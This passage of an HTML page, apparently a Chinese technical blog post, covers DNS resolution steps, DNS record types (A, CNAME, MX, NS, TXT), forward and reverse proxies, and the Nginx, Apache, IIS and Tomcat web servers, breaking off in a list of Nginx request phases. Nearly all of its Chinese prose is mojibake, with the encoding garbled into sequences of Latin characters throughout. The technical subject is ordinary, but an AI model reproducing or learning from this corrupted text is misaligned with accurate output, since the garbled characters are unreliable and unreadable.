ä¸ºåŸŸåæœåŠ¡å™¨ä¹‹é—´ä¼šæœ‰å¤§é‡çš„æ•°æ®éœ€è¦å¤„ç†ï¼Œæ‰€ä»¥DNSæœåŠ¡å™¨ä¹‹é—´ä¸€èˆ¬é‡‡ç”¨è¿­ä»£æŸ¥è¯¢æ–¹å¼ã€‚æœ¬åœ°åŸŸåè§£ææœåŠ¡å™¨å‘gTLDæœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚</p><p>(7) <strong>gTLDæœåŠ¡å™¨æ¥æ”¶è¯·æ±‚å¹¶è¿”å›Name ServeræœåŠ¡å™¨</strong></p><p>æŒ‡å®šçš„åŸŸåç”±æŒ‡å®šçš„Name ServeræœåŠ¡å™¨è¿›è¡Œè§£æã€‚</p><p>(8) <strong>Name ServeræœåŠ¡å™¨è¿”å›IPåœ°å€ç»™æœ¬åœ°æœåŠ¡å™¨</strong></p><p>æœåŠ¡å™¨æŸ¥æ‰¾åŸŸåå¯¹åº”çš„åœ°å€ï¼Œå°†åœ°å€è¿åŒå€¼è¿”å›ç»™æœ¬åœ°åŸŸåæœåŠ¡å™¨ã€‚</p><p>(9) <strong>æœ¬åœ°åŸŸåæœåŠ¡å™¨ç¼“å­˜è§£æç»“æœ</strong></p><p>æœ¬åœ°åŸŸåæœåŠ¡å™¨ç¼“å­˜è§£æåçš„ç»“æœï¼Œç¼“å­˜æ—¶é—´ç”±TTLå€¼æ§åˆ¶ã€‚</p><p>(10) <strong>è¿”å›è§£æç»“æœç»™ç”¨æˆ·</strong></p><p>è§£æç»“æœå°†ç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œç”¨æˆ·ç³»ç»Ÿå°†ç¼“å­˜è¯¥åœ°å€ï¼Œç”¨æˆ·æ ¹æ®TTLå€¼ç¼“å­˜åœ¨æœ¬åœ°ç³»ç»Ÿç¼“å­˜ä¸­ï¼ŒåŸŸåè§£æè¿‡ç¨‹ç»“æŸã€‚</p><h2 id="åŸŸåè§£æè®°å½•"><a href="#åŸŸåè§£æè®°å½•" class="headerlink" title="åŸŸåè§£æè®°å½•"></a>åŸŸåè§£æè®°å½•</h2><ul><li><p>A(Address)è®°å½•ï¼šç”¨æ¥æŒ‡å®šä¸»æœºåï¼ˆæˆ–åŸŸåï¼‰å¯¹åº”çš„IPåœ°å€è®°å½•ã€‚</p></li><li><p>CNAME(åˆ«å)è®°å½•ï¼šå³åˆ«åè®°å½•ã€‚è¿™ç§è®°å½•å…è®¸æ‚¨å°†å¤šä¸ªåå­—æ˜ å°„åˆ°å¦å¤–ä¸€ä¸ªåŸŸåã€‚é€šå¸¸ç”¨äºåŒæ—¶æä¾›WWWå’ŒMAILæœåŠ¡çš„è®¡ç®—æœºã€‚ä¾‹å¦‚ï¼Œæœ‰ä¸€å°è®¡ç®—æœºåä¸ºâ€œhost.mydomain.comâ€ï¼ˆAè®°å½•ï¼‰ã€‚å®ƒåŒæ—¶æä¾›WWWå’ŒMAILæœåŠ¡ï¼Œä¸ºäº†ä¾¿äºç”¨æˆ·è®¿é—®æœåŠ¡ã€‚å¯ä»¥ä¸ºè¯¥è®¡ç®—æœºè®¾ç½®ä¸¤ä¸ªåˆ«åï¼ˆCNAMEï¼‰ï¼šWWWå’ŒMAILã€‚è¿™ä¸¤ä¸ªåˆ«åçš„å…¨ç§°å°± <a href="http://www.mydomain.com/%E5%92%8C%E2%80%9Cmail.mydomain.com%E2%80%9D%E3%80%82%E5%AE%9E%E9%99%85%E4%B8%8A%E4%BB%96%E4%BB%AC%E9%83%BD%E6%8C%87%E5%90%91">http://www.mydomain.com/å’Œâ€œmail.mydomain.comâ€ã€‚å®é™…ä¸Šä»–ä»¬éƒ½æŒ‡å‘</a> â€œhost.mydomain.comâ€ã€‚</p></li><li><p>MX è®°å½•ï¼š é‚®ä»¶äº¤æ¢è®°å½•ã€‚å®ƒæŒ‡å‘â¼€ä¸ªé‚®ä»¶æœåŠ¡å™¨ï¼Œâ½¤äºç”µâ¼¦é‚®ä»¶ç³»ç»Ÿå‘é‚®<br>ä»¶æ—¶æ ¹æ® æ”¶ä¿¡â¼ˆçš„åœ°å€åç¼€æ¥å®šä½é‚®ä»¶æœåŠ¡å™¨ã€‚å¦‚ï¼šç”¨æˆ·æ‰€ç”¨çš„é‚®ä»¶æ˜¯ä»¥åŸŸåmydomain.comä¸ºç»“å°¾çš„ï¼Œåˆ™éœ€è¦åœ¨ç®¡ç†ç•Œé¢ä¸­æ·»åŠ è¯¥åŸŸåçš„MXè®°å½•æ¥å¤„ç†æ‰€æœ‰ä»¥@mydomain.comç»“å°¾çš„é‚®ä»¶ã€‚</p></li><li><p>NS(Name Server)è®°å½•ï¼šè§£ææœåŠ¡å™¨è®°å½•ã€‚â½¤æ¥è¡¨æ˜ç”±å“ªå°æœåŠ¡å™¨å¯¹è¯¥åŸŸåè¿›â¾è§£æã€‚è¿™â¾¥çš„NS<br>è®°å½•åªå¯¹â¼¦åŸŸåâ½£æ•ˆã€‚ä¾‹å¦‚ç”¨æˆ·å¸Œæœ›ç”±12.34.56.78è¿™å°æœåŠ¡å™¨è§£ænews.mydomain.comï¼Œåˆ™éœ€è¦è®¾ç½®news.mydomain.comçš„NSè®°å½•ã€‚ ã€€ã€€</p></li><li><p>TXTè®°å½•ï¼šâ¼€èˆ¬æŒ‡ä¸ºæŸä¸ªä¸»æœºåæˆ–åŸŸåè®¾ç½®çš„è¯´æ˜</p></li></ul><h1 id="web-é¡µé¢è¯·æ±‚çš„æµç¨‹"><a href="#web-é¡µé¢è¯·æ±‚çš„æµç¨‹" class="headerlink" title="web é¡µé¢è¯·æ±‚çš„æµç¨‹"></a>web é¡µé¢è¯·æ±‚çš„æµç¨‹</h1><h2 id="Webä¸­é—´ä»¶"><a href="#Webä¸­é—´ä»¶" class="headerlink" title="Webä¸­é—´ä»¶"></a>Webä¸­é—´ä»¶</h2><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>Nginx æ€§èƒ½ç¨³å®šã€åŠŸèƒ½ä¸°å¯Œã€è¿ç»´ç®€å•ã€å¤„ç†é™æ€æ–‡ä»¶é€Ÿåº¦å¿«ä¸”æ¶ˆè€—ç³»ç»Ÿèµ„æºæå°‘ã€‚<br>1ã€ç›¸æ¯” Apacheï¼Œç”¨ Nginx ä½œä¸º Web æœåŠ¡å™¨ï¼šä½¿ç”¨èµ„æºæ›´å°‘ï¼Œæ”¯æŒæ›´å¤šå¹¶å‘è¿æ¥ï¼Œæ•ˆç‡æ›´é«˜ã€‚<br>2ã€ä½œä¸ºè´Ÿè½½å‡è¡¡æœåŠ¡å™¨ï¼šNginx æ—¢å¯åœ¨å†…éƒ¨ç›´æ¥æ”¯æŒ Rails å’Œ PHPï¼Œä¹Ÿå¯æ”¯æŒä½œä¸º HTTP ä»£ç†æœåŠ¡å™¨å¯¹å¤–è¿›è¡ŒæœåŠ¡ã€‚Nginx ç”¨ C ç¼–å†™è€Œæˆï¼Œ ä¸è®ºæ˜¯ç³»ç»Ÿèµ„æºå¼€é”€è¿˜æ˜¯ CPU ä½¿ç”¨æ•ˆç‡éƒ½æ¯” Perlbal è¦å¥½çš„å¤šã€‚<br>3ã€ä½œä¸ºé‚®ä»¶ä»£ç†æœåŠ¡å™¨ï¼šNginx åŒæ—¶ä¹Ÿæ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„é‚®ä»¶ä»£ç†æœåŠ¡å™¨ï¼ˆæœ€æ—©å¼€å‘è¿™ä¸ªäº§å“çš„ç›®çš„ä¹‹ä¸€ï¼Œæ˜¯ä½œä¸ºé‚®ä»¶ä»£ç†æœåŠ¡å™¨ï¼‰ã€‚</p><p>4ã€åå‘ä»£ç†å¯ä»¥æ ¹æ®urlå°†è¯·æ±‚è½¬å‘äºä¸åŒç”¨é€”çš„é›†ç¾¤ï¼Œæ¯”å¦‚å›¾ç‰‡è¯·æ±‚ï¼Œè½¬å‘å›¾ç‰‡æœåŠ¡å™¨é›†ç¾¤ï¼›è§†é¢‘è¯·æ±‚ï¼Œè½¬èº«è§†é¢‘æœåŠ¡å™¨é›†ç¾¤ã€‚</p><p>nginxæ˜¯ä¸€æ¬¾è½»é‡çº§çš„webæœåŠ¡å™¨/åå‘ä»£ç†æœåŠ¡å™¨/ç”µå­é‚®ä»¶ä»£ç†æœåŠ¡å™¨ï¼Œå®‰è£…éå¸¸ç®€å•ï¼Œé…ç½®æ–‡ä»¶ä¹Ÿå¾ˆç®€æ´ï¼ˆè¿˜æ”¯æŒ perl è¯­æ³•ï¼‰ã€‚Nginx æ”¯æŒå¹³æ»‘åŠ è½½æ–°é…ç½®ï¼Œè¿˜èƒ½å¤Ÿåœ¨ä¸é—´æ–­æœåŠ¡çš„æƒ…å†µä¸‹è¿›è¡Œè½¯ä»¶ç‰ˆæœ¬å‡çº§ã€‚</p><p><strong>#ä»£ç†</strong></p><p>åœ¨Javaè®¾è®¡æ¨¡å¼ä¸­ï¼Œä»£ç†æ¨¡å¼æ˜¯è¿™æ ·å®šä¹‰çš„ï¼šç»™æŸä¸ªå¯¹è±¡æä¾›ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œå¹¶ç”±ä»£ç†å¯¹è±¡æ§åˆ¶åŸå¯¹è±¡çš„å¼•ç”¨ã€‚</p><p>å¯èƒ½å¤§å®¶ä¸å¤ªæ˜ç™½è¿™å¥è¯ï¼Œåœ¨ä¸¾ä¸€ä¸ªç°å®ç”Ÿæ´»ä¸­çš„ä¾‹å­ï¼šæ¯”å¦‚æˆ‘ä»¬è¦ä¹°ä¸€é—´äºŒæ‰‹æˆ¿ï¼Œè™½ç„¶æˆ‘ä»¬å¯ä»¥è‡ªå·±å»æ‰¾æˆ¿æºï¼Œä½†æ˜¯è¿™å¤ªèŠ±è´¹æ—¶é—´ç²¾åŠ›äº†ï¼Œè€Œä¸”æˆ¿å±‹è´¨é‡æ£€æµ‹ä»¥åŠæˆ¿å±‹è¿‡æˆ·ç­‰ä¸€ç³»åˆ—æ‰‹ç»­ä¹Ÿéƒ½å¾—æˆ‘ä»¬å»åŠï¼Œå†è¯´ç°åœ¨è¿™ä¸ªç¤¾ä¼šï¼Œç­‰æˆ‘ä»¬æ‰¾åˆ°æˆ¿æºï¼Œè¯´ä¸å®šæˆ¿å­éƒ½å·²ç»æ¶¨ä»·äº†ï¼Œé‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿæœ€ç®€å•å¿«æ·çš„æ–¹æ³•å°±æ˜¯æ‰¾äºŒæ‰‹æˆ¿ä¸­ä»‹å…¬å¸ï¼ˆä¸ºä»€ä¹ˆï¼Ÿåˆ«äººé‚£é‡Œæˆ¿æºå¤šå•Šï¼‰ï¼Œäºæ˜¯æˆ‘ä»¬å°±å§”æ‰˜ä¸­ä»‹å…¬å¸æ¥ç»™æˆ‘æ‰¾åˆé€‚çš„æˆ¿å­ï¼Œä»¥åŠåç»­çš„è´¨é‡æ£€æµ‹è¿‡æˆ·ç­‰æ“ä½œï¼Œæˆ‘ä»¬åªéœ€è¦é€‰å¥½è‡ªå·±æƒ³è¦çš„æˆ¿å­ï¼Œç„¶åäº¤é’±å°±è¡Œäº†ã€‚</p><p>ä»£ç†ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¦‚æœæˆ‘ä»¬æƒ³åšä»€ä¹ˆï¼Œä½†åˆä¸æƒ³ç›´æ¥å»åšï¼Œé‚£ä¹ˆè¿™æ—¶å€™å°±æ‰¾å¦å¤–ä¸€ä¸ªäººå¸®æˆ‘ä»¬å»åšã€‚é‚£ä¹ˆè¿™ä¸ªä¾‹å­é‡Œé¢çš„ä¸­ä»‹å…¬å¸å°±æ˜¯ç»™æˆ‘ä»¬åšä»£ç†æœåŠ¡çš„ï¼Œæˆ‘ä»¬å§”æ‰˜ä¸­ä»‹å…¬å¸å¸®æˆ‘ä»¬æ‰¾æˆ¿å­ã€‚</p><ul><li><strong>æ­£å‘ä»£ç†</strong></li></ul><p>å¼„æ¸…æ¥šä»€ä¹ˆæ˜¯ä»£ç†äº†ï¼Œé‚£ä¹ˆä»€ä¹ˆåˆæ˜¯æ­£å‘ä»£ç†å‘¢ï¼Ÿ</p><p>è¿™é‡Œæˆ‘å†ä¸¾ä¸€ä¸ªä¾‹å­ï¼šå¤§å®¶éƒ½çŸ¥é“ï¼Œç°åœ¨å›½å†…æ˜¯è®¿é—®ä¸äº† Googleçš„ï¼Œé‚£ä¹ˆæ€ä¹ˆæ‰èƒ½è®¿é—® Googleå‘¢ï¼Ÿæˆ‘ä»¬åˆæƒ³ï¼Œç¾å›½äººä¸æ˜¯èƒ½è®¿é—® Googleå—ï¼ˆè¿™ä¸åºŸè¯ï¼ŒGoogleå°±æ˜¯ç¾å›½çš„ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬ç”µè„‘çš„å¯¹å¤–å…¬ç½‘ IP åœ°å€èƒ½å˜æˆç¾å›½çš„ IP åœ°å€ï¼Œé‚£ä¸å°±å¯ä»¥è®¿é—® Googleäº†ã€‚ä½ å¾ˆèªæ˜ï¼ŒVPN å°±æ˜¯è¿™æ ·äº§ç”Ÿçš„ã€‚æˆ‘ä»¬åœ¨è®¿é—® Google æ—¶ï¼Œå…ˆè¿ä¸Š VPN æœåŠ¡å™¨å°†æˆ‘ä»¬çš„ IP åœ°å€å˜æˆç¾å›½çš„ IP åœ°å€ï¼Œç„¶åå°±å¯ä»¥é¡ºåˆ©çš„è®¿é—®äº†ã€‚</p><p>è¿™é‡Œçš„ VPN å°±æ˜¯åšæ­£å‘ä»£ç†çš„ã€‚æ­£å‘ä»£ç†æœåŠ¡å™¨ä½äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ï¼Œä¸ºäº†å‘æœåŠ¡å™¨è·å–æ•°æ®ï¼Œå®¢æˆ·ç«¯è¦å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå¹¶æŒ‡å®šç›®æ ‡æœåŠ¡å™¨ï¼Œä»£ç†æœåŠ¡å™¨å°†ç›®æ ‡æœåŠ¡å™¨è¿”å›çš„æ•°æ®è½¬äº¤ç»™å®¢æˆ·ç«¯ã€‚è¿™é‡Œå®¢æˆ·ç«¯æ˜¯è¦è¿›è¡Œä¸€äº›æ­£å‘ä»£ç†çš„è®¾ç½®çš„ã€‚</p><ul><li><strong>åå‘ä»£ç†</strong></li></ul><p>åå‘ä»£ç†å’Œæ­£å‘ä»£ç†çš„åŒºåˆ«å°±æ˜¯ï¼š<strong>æ­£å‘ä»£ç†ä»£ç†å®¢æˆ·ç«¯ï¼Œåå‘ä»£ç†ä»£ç†æœåŠ¡å™¨ã€‚</strong></p><p>åå‘ä»£ç†ï¼Œå…¶å®å®¢æˆ·ç«¯å¯¹ä»£ç†æ˜¯æ— æ„ŸçŸ¥çš„ï¼Œå› ä¸ºå®¢æˆ·ç«¯ä¸éœ€è¦ä»»ä½•é…ç½®å°±å¯ä»¥è®¿é—®ï¼Œæˆ‘ä»¬åªéœ€è¦å°†è¯·æ±‚å‘é€åˆ°åå‘ä»£ç†æœåŠ¡å™¨ï¼Œç”±åå‘ä»£ç†æœåŠ¡å™¨å»é€‰æ‹©ç›®æ ‡æœåŠ¡å™¨è·å–æ•°æ®åï¼Œåœ¨è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶åå‘ä»£ç†æœåŠ¡å™¨å’Œç›®æ ‡æœåŠ¡å™¨å¯¹å¤–å°±æ˜¯ä¸€ä¸ªæœåŠ¡å™¨ï¼Œæš´éœ²çš„æ˜¯ä»£ç†æœåŠ¡å™¨åœ°å€ï¼Œéšè—äº†çœŸå®æœåŠ¡å™¨IPåœ°å€ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡ä¸¤å¼ å›¾æ¥å¯¹æ¯”æ­£å‘ä»£ç†å’Œæ–¹å‘ä»£ç†ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/nginx2.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/nginx3.png"></p><p>ç†è§£è¿™ä¸¤ç§ä»£ç†çš„å…³é”®åœ¨äºä»£ç†æœåŠ¡å™¨æ‰€ä»£ç†çš„å¯¹è±¡æ˜¯ä»€ä¹ˆï¼Œæ­£å‘ä»£ç†ä»£ç†çš„æ˜¯å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å®¢æˆ·ç«¯è¿›è¡Œä¸€äº›ä»£ç†çš„è®¾ç½®ã€‚è€Œåå‘ä»£ç†ä»£ç†çš„æ˜¯æœåŠ¡å™¨ï¼Œä½œä¸ºå®¢æˆ·ç«¯çš„æˆ‘ä»¬æ˜¯æ— æ³•æ„ŸçŸ¥åˆ°æœåŠ¡å™¨çš„çœŸå®å­˜åœ¨çš„ã€‚</p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>1ã€Apache æ˜¯ LAMP æ¶æ„æœ€æ ¸å¿ƒçš„ Web Serverï¼Œå¼€æºã€ç¨³å®šã€æ¨¡å—ä¸°å¯Œæ˜¯ Apache çš„ä¼˜åŠ¿ã€‚ä½† Apache çš„ç¼ºç‚¹æ˜¯æœ‰äº›è‡ƒè‚¿ï¼Œå†…å­˜å’Œ CPU å¼€é”€å¤§ï¼Œæ€§èƒ½ä¸Šæœ‰æŸè€—ï¼Œä¸å¦‚ä¸€äº›è½»é‡çº§çš„ Web æœåŠ¡å™¨ï¼ˆè­¬å¦‚ï¼šNginxã€Tengineç­‰ï¼‰é«˜æ•ˆï¼Œè½»é‡çº§çš„ Web æœåŠ¡å™¨å¯¹äºé™æ€æ–‡ä»¶çš„å“åº”èƒ½åŠ›æ¥è¯´è¿œé«˜äº Apache æœåŠ¡å™¨ã€‚</p><p>2ã€Apache åšä¸º Web Server æ˜¯è´Ÿè½½ PHP çš„æœ€ä½³é€‰æ‹©ï¼Œå¦‚æœæµé‡å¾ˆå¤§çš„è¯ï¼Œå¯ä»¥é‡‡ç”¨ Nginx æ¥è´Ÿè½½é PHP çš„ Web è¯·æ±‚ã€‚Nginx æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„ HTTP å’Œåå‘ä»£ç†æœåŠ¡å™¨ï¼ŒNginx ä»¥å…¶ç¨³å®šã€ä¸°å¯ŒåŠŸèƒ½é›†ã€ç¤ºä¾‹é…ç½®æ–‡ä»¶å’Œä½ç³»ç»Ÿèµ„æºçš„æ¶ˆè€—è€Œé—»åã€‚Nginx ç°èƒ½æ”¯æŒ PHP å’Œ FastCGIï¼Œä¹Ÿæ”¯æŒè´Ÿè½½å‡è¡¡å’Œå®¹é”™ï¼Œå¯å’Œ Apache é…åˆä½¿ç”¨ï¼Œæ˜¯è½»é‡çº§çš„ HTTP æœåŠ¡å™¨çš„é¦–é€‰ã€‚</p><p>3ã€Web æœåŠ¡å™¨ç¼“å­˜ä¹Ÿæœ‰å¤šç§æ–¹æ¡ˆï¼ŒApache æä¾›äº†è‡ªå·±çš„ç¼“å­˜æ¨¡å—ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¤–åŠ çš„ Squid æ¨¡å—è¿›è¡Œç¼“å­˜ï¼Œè¿™ä¸¤ç§æ–¹å¼å‡å¯æœ‰æ•ˆæé«˜ Apache çš„è®¿é—®å“åº”èƒ½åŠ›ã€‚Squid Cache æ˜¯ä¸€ä¸ª Web ç¼“å­˜æœåŠ¡å™¨ï¼Œæ”¯æŒé«˜æ•ˆç¼“å­˜ï¼Œå¯ä½œä¸ºç½‘é¡µæœåŠ¡å™¨çš„å‰ç½® cache æœåŠ¡å™¨ç¼“å­˜ç›¸å…³è¯·æ±‚ä»¥æé«˜ Web æœåŠ¡å™¨é€Ÿåº¦ã€‚æŠŠ Squid æ”¾åœ¨ Apache çš„å‰ç«¯æ¥ç¼“å­˜ Web æœåŠ¡å™¨ç”ŸæˆåŠ¨æ€å†…å®¹ï¼Œè€Œ Web åº”ç”¨ç¨‹åºåªéœ€è¦é€‚å½“åœ°è®¾ç½®é¡µé¢å®æ•ˆæ—¶é—´å³å¯ã€‚å¦‚è®¿é—®é‡å·¨å¤§ï¼Œåˆ™å¯è€ƒè™‘ä½¿ç”¨ memcache ä½œä¸ºåˆ†å¸ƒå¼ç¼“å­˜ã€‚</p><p>4ã€PHP çš„åŠ é€Ÿå¯ä½¿ç”¨ eAccelerator åŠ é€Ÿå™¨ï¼ŒeAccelerator æ˜¯ä¸€ä¸ªè‡ªç”±å¼€æ”¾æºç çš„ PHP åŠ é€Ÿå™¨ã€‚å®ƒä¼šä¼˜åŒ–åŠ¨æ€å†…å®¹ç¼“å­˜ï¼Œæé«˜ PHP è„šæœ¬ç¼“å­˜æ€§èƒ½ï¼Œä½¿ PHP è„šæœ¬åœ¨ç¼–è¯‘çŠ¶æ€ä¸‹ï¼Œå¯¹æœåŠ¡å™¨çš„å¼€é”€å‡ ä¹å®Œå…¨æ¶ˆé™¤ã€‚å®ƒè¿˜å¯å¯¹è„šæœ¬èµ·ä¼˜åŒ–ä½œç”¨ï¼Œä»¥åŠ å¿«å…¶æ‰§è¡Œæ•ˆç‡ã€‚ ä½¿ PHP ç¨‹åºä»£ç æ‰§æ•ˆç‡å¯æé«˜ 1-10 å€ã€‚</p><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><p><strong>IIS</strong>æ˜¯<strong>Internet</strong> <strong>Information</strong> <strong>Services</strong>çš„ç¼©å†™ï¼Œæ„ä¸ºäº’è”ç½‘ä¿¡æ¯æœåŠ¡ï¼Œæ˜¯ç”±å¾®è½¯å…¬å¸æä¾›çš„åŸºäº è¿è¡Œ<strong>Microsoft</strong> <strong>Windows</strong>çš„äº’è”ç½‘åŸºæœ¬æœåŠ¡ã€‚ æœ€åˆæ˜¯<strong>Windows</strong> <strong>NT</strong>ç‰ˆæœ¬çš„å¯é€‰åŒ…ï¼Œéšåå†…ç½®åœ¨<strong>Windows</strong> 2000ã€<strong>Windows</strong> <strong>XP</strong> <strong>Professional</strong>å’Œ <strong>Windows</strong> <strong>Server</strong> 2003ä¸€èµ·å‘è¡Œï¼Œä½†åœ¨<strong>Windows</strong> <strong>XP</strong> <strong>Home</strong>ç‰ˆæœ¬ä¸Šå¹¶æ²¡æœ‰<strong>IIS</strong>ã€‚ <strong>IIS</strong>æ˜¯ä¸€ç§<strong>Web</strong>ï¼ˆç½‘é¡µï¼‰æœåŠ¡ç»„ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬<strong>Web</strong>æœåŠ¡å™¨ã€<strong>FTP</strong>æœåŠ¡å™¨ã€<strong>NNTP</strong>æœåŠ¡å™¨å’Œ<strong>SMTP</strong>æœåŠ¡å™¨ï¼Œ åˆ†åˆ«ç”¨äºç½‘é¡µæµè§ˆã€æ–‡ä»¶ä¼ è¾“ã€æ–°é—»æœåŠ¡å’Œé‚®ä»¶å‘é€ç­‰æ–¹é¢ï¼Œå®ƒä½¿å¾—åœ¨ç½‘ç»œï¼ˆåŒ…æ‹¬äº’è”ç½‘å’Œå±€åŸŸç½‘ï¼‰ ä¸Šå‘å¸ƒä¿¡æ¯æˆäº†ä¸€ä»¶å¾ˆå®¹æ˜“çš„äº‹ã€‚ <strong>IIS</strong>æœ€ç»å…¸çš„ç‰ˆæœ¬æ˜¯<strong>IIS6</strong>.0ï¼Œæœ€å¸¸è§äº<strong>Windows</strong> <strong>Server</strong> 2003ç³»ç»Ÿä¸­ï¼›<strong>IIS7</strong>.0åˆ™å¸¸è§äº <strong>Windows</strong> <strong>Server</strong> 2008ä¸­ã€‚ ç›®å‰ï¼ˆ2017å¹´ï¼‰æœ€æ–°çš„ç‰ˆæœ¬æ˜¯<strong>IIS10</strong>.0ï¼Œå¸¸è§äº<strong>Windows</strong> <strong>Server</strong> 2016ä¸­ã€‚</p><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>Tomcatï¼ˆApache Tomcatï¼‰æ˜¯Apache è½¯ä»¶åŸºé‡‘ä¼šï¼ˆApache Software Foundationï¼‰çš„Jakarta é¡¹ç›®ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒé¡¹ç›®ï¼Œç”±Apacheã€Sunå’Œå…¶ä»–å…¬å¸åŠä¸ªäººå…±åŒå¼€å‘è€Œæˆã€‚</p><p>Tomcat æœåŠ¡å™¨æ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æ”¾æºä»£ç çš„Web åº”ç”¨æœåŠ¡å™¨ï¼Œå±äºè½»é‡çº§åº”ç”¨æœåŠ¡å™¨ï¼Œåœ¨ä¸­å°å‹ç³»ç»Ÿå’Œå¹¶å‘è®¿é—®ç”¨æˆ·ä¸æ˜¯å¾ˆå¤šçš„åœºåˆä¸‹è¢«æ™®éä½¿ç”¨ï¼Œæ˜¯å¼€å‘å’Œè°ƒè¯•JSP ç¨‹åºçš„é¦–é€‰ã€‚</p><p>å¯¹äºä¸€ä¸ªåˆå­¦è€…æ¥è¯´ï¼Œå¯ä»¥è¿™æ ·è®¤ä¸ºï¼Œå½“åœ¨ä¸€å°æœºå™¨ä¸Šé…ç½®å¥½Apache æœåŠ¡å™¨ï¼Œå¯åˆ©ç”¨å®ƒå“åº”HTMLï¼ˆæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€ä¸‹çš„ä¸€ä¸ªåº”ç”¨ï¼‰é¡µé¢çš„è®¿é—®è¯·æ±‚ã€‚</p><p>å®é™…ä¸ŠTomcatæ˜¯Apache æœåŠ¡å™¨çš„æ‰©å±•ï¼Œä½†è¿è¡Œæ—¶å®ƒæ˜¯ç‹¬ç«‹è¿è¡Œçš„ï¼Œæ‰€ä»¥å½“ä½ è¿è¡Œtomcat æ—¶ï¼Œå®ƒå®é™…ä¸Šä½œä¸ºä¸€ä¸ªä¸Apache ç‹¬ç«‹çš„è¿›ç¨‹å•ç‹¬è¿è¡Œçš„ã€‚</p><p>å½“é…ç½®æ­£ç¡®æ—¶ï¼ŒApache ä¸ºHTMLé¡µé¢æœåŠ¡ï¼Œè€ŒTomcat å®é™…ä¸Šè¿è¡ŒJSP é¡µé¢å’ŒServletã€‚å¦å¤–ï¼ŒTomcatå’ŒIISç­‰WebæœåŠ¡å™¨ä¸€æ ·ï¼Œå…·æœ‰å¤„ç†HTMLé¡µé¢çš„åŠŸèƒ½ã€‚</p><p>å¦å¤–å®ƒè¿˜æ˜¯ä¸€ä¸ªServletå’ŒJSPå®¹å™¨ï¼Œç‹¬ç«‹çš„Servletå®¹å™¨æ˜¯Tomcatçš„é»˜è®¤æ¨¡å¼ã€‚ä¸è¿‡ï¼ŒTomcatå¤„ç†é™æ€HTMLçš„èƒ½åŠ›ä¸å¦‚ApacheæœåŠ¡å™¨ã€‚</p><h2 id="Nginxçš„è¯·æ±‚å¤„ç†é˜¶æ®µ"><a href="#Nginxçš„è¯·æ±‚å¤„ç†é˜¶æ®µ" class="headerlink" title="Nginxçš„è¯·æ±‚å¤„ç†é˜¶æ®µ"></a>Nginxçš„è¯·æ±‚å¤„ç†é˜¶æ®µ</h2><p>Nginx å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸€å…±åˆ’åˆ†ä¸º 11 ä¸ªé˜¶æ®µï¼ŒæŒ‰ç…§æ‰§è¡Œé¡ºåºä¾æ¬¡æ˜¯ post-readã€server-rewriteã€find-configã€rewriteã€post-rewriteã€preaccessã€accessã€post-accessã€try-filesã€content ä»¥åŠ logã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/nginx1.png"></p><p><code>POST_READ</code> è¯»å–HTTPå¤´éƒ¨ï¼Œè¯»å–å¹¶è§£æå†…å®¹</p><p><code>server-rewrite</code>åœ¨URLä¸locationåŒ¹é…ä¹‹å‰ä¿®æ”¹è¯·æ±‚çš„URLï¼ˆé‡å®šå‘ï¼‰ï¼Œåœ¨serverå—ä¸­çš„è¯·æ±‚åœ°å€é‡å†™</p><p><code>find-config</code>é…ç½®æŸ¥æ‰¾é˜¶æ®µï¼Œæ ¹æ®è¯·æ±‚çš„URLåŒ¹é…locationè¡¨è¾¾å¼ï¼›ä¸æ”¯æŒnginxæ¨¡å—æ³¨å†Œå¤„ç†ç¨‹åºï¼Œè€Œæ˜¯ç”±ngx_http_core_moduleæ¨¡å—æ¥å®Œæˆå½“å‰è¯·æ±‚ä¸locationé…ç½®ä¹‹é—´çš„åŒ¹é…</p><p><code>rewrite</code>locationå—è¿½è¸ªçš„è¯·æ±‚åœ°å€é‡å†™é˜¶æ®µï¼Œå½“rewriteæŒ‡ä»¤ç”¨äºlocationä¸­åˆ™è¿è¡Œï¼›ngx_luaæ¨¡å—ä¸­çš„set_by_luaæŒ‡ä»¤å’Œrewrite_by_luaæŒ‡ä»¤ä¹Ÿåœ¨è¿™é‡Œ</p><p><code>post-rewrite</code>è¯·æ±‚åœ°å€é‡å†™æäº¤é˜¶æ®µï¼Œé˜²æ­¢é€’å½’ä¿®æ”¹URLé€ 